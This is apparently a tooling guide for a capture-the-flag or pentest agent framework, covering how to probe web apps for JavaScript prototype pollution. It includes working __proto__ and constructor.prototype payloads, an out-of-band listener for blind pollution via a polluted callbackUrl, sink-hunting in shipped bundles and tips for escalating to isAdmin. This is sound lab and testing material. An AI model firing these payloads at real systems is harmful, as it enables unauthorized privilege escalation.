# Tooling — the installed helpers and how to drive them

The tools that emit the shape `hooks.py post-probe` wants — each holds
the request and response together so the evidence quote is checked,
not trusted.

---

## 1. `tools/web/pp_probe.py` — the class's own tool

```
usage: pp_probe.py [-h] [--url URL] [--method {POST,GET,PUT,PATCH}]
                   [--body BODY] [--readback READBACK]
                   [--headers [HEADERS ...]] [--timeout TIMEOUT]
                   [--selftest]
```

```bash
# the canonical run
python3 tools/web/pp_probe.py --url "$BASE/api/profile" \
  --body '{"__proto__":{"ppmarker":"v1"}}' \
  --readback "$BASE/api/me"

# a non-default method
python3 tools/web/pp_probe.py --url "$BASE/api/settings" --method PATCH \
  --body '{"__proto__":{"ppmarker":"v1"}}' --readback "$BASE/api/me"

# with auth
python3 tools/web/pp_probe.py --url "$BASE/api/settings" \
  --body '{"__proto__":{"ppmarker":"v1"}}' --readback "$BASE/api/me" \
  --headers 'Cookie: session=$B' 'Content-Type: application/json'
```

The matrix: `__proto__` through JSON / form / query carriers at the
merge endpoint, then the `--readback` URL fetch. Verdicts:

- `marker-on-readback` — the marker appeared where it was never set →
  global write confirmed.
- `readback-changed` — the readback response differs without the
  marker visible → a fallback consumed it → the sink read it.
- neither → the merge rejected the key or the carrier never reached
  it → record `refutes` for this site.

## 2. `tools/web/http_probe.py` — the evidence carrier

For the manual probes (the carriers `pp_probe` doesn't iterate —
nested depth, `constructor.prototype`, dotted-path, exotic content
types):

```bash
python3 tools/web/http_probe.py --challenge "$C" \
  --class web-prototype-pollution \
  --method POST --url "$BASE/api/settings" \
  --header 'Content-Type: application/json' \
  --body '{"constructor":{"prototype":{"ppmarker":"v1"}}}' \
  --evidence-regex '"ppmarker"\s*:\s*"v1"' \
  --evidence-kind class
```

Flags that matter here: `--challenge --class --method --url --header
--body --evidence-regex --evidence-contains --evidence-kind
--write-ack --allow-repeat --timeout --no-follow --search-headers
--body-chars --compact`. `http_probe` holds the request and response
together and prints the complete `hooks.py post-probe` command —
including `--hypothesis-id`, `--evidence` and `--response`, which
belong to `post-probe`, not to `http_probe` itself.

## 3. `tools/web/id_sweep.py` — not this class

`id_sweep` is for sequential-id IDOR — don't reach for it here;
pollution is a single-write class, not an enumeration.

## 4. `tools/web/bundle_miner.py` — the sink hunter (black-box)

```bash
python3 tools/web/bundle_miner.py --url "$BASE" --out /tmp/bundle
```

Recovers `sources` + `sourcesContent` from the shipped JS; grep the
output for `merge(`, `extend(`, `defaults`, `opts.`, `config.`,
`??`, `||`, `hasOwnProperty`, `process.env`, `spawn`, `compile(` —
each is a readable-property or sink-callsite name.

## 5. `tools/web/oob_listener.py` — the blind-pollution readback

```bash
python3 tools/web/oob_listener.py serve --port 8000 &
python3 tools/web/oob_listener.py hits
```

Pollute `{"__proto__":{"callbackUrl":"http://<listener>/"}}` — a hit
on the listener is the readback.

## 6. `tools/web/session_dissect.py` — the session format

When the session itself carries the merged object (a `prefs` cookie
JSON-parsed into the session):

```bash
python3 tools/web/session_dissect.py --token 'eyJ...' --wordlist <wl>
```

Names the cookie's format; the merge into session state is the
carrier.

## 7. `tools/gadget_lookup.py` — the version check

```bash
python3 tools/gadget_lookup.py --lockfile <handout>/package-lock.json
```

Reads the real pinned versions and names which merge library is
vulnerable — lodash<4.17.21, merge<2.1.1, deep-extend, etc. The
version decides the payload shape (`__proto__` vs
`constructor.prototype`).

## 8. The control-plane trio

```bash
python3 tools/classify.py "<obs>"
python3 tools/chain_match.py --record $C
python3 tools/state.py $C --hypothesis "..." --bug-class web-prototype-pollution
python3 tools/state.py $C --hypothesis-id <id> --probe "..." --result "..." --status confirmed
python3 tools/hooks.py pre-probe "$C" --class web-prototype-pollution \
  --request "POST /api/settings ..." --hypothesis-id H1
python3 tools/hooks.py post-probe "$C" --class web-prototype-pollution \
  --hypothesis-id H1 --verdict confirms --evidence-kind class \
  --evidence '"ppmarker":"v1"' --response '<the bytes>'
python3 tools/hooks.py pre-flag "$C" --value 'flag{...}' \
  --source "$BASE/admin" --evidence '<the bytes>'
python3 tools/decide.py $C
```

## 9. The qs-parser check

```bash
curl -s "$BASE/x?a[b]=1" | head -c 200
# {"a":{"b":"1"}} → extended parser → __proto__[x]=1 shape works
# {"a[b]":"1"}   → simple parser → dotted-path payloads instead
```

## 10. The "don't" list

- Don't sweep ids — this is a write-class, not an enumeration.
- Don't write a security property first — the marker proves the
  write before the payoff.
- Don't write `isAdmin` as a string when the check is `=== true`.
- Don't skip the fresh-object readback — a `200` on the update is not
  a confirm.
- Don't pollute `Object.prototype` broadly on a shared instance —
  pick the narrowest key path the sink reads.
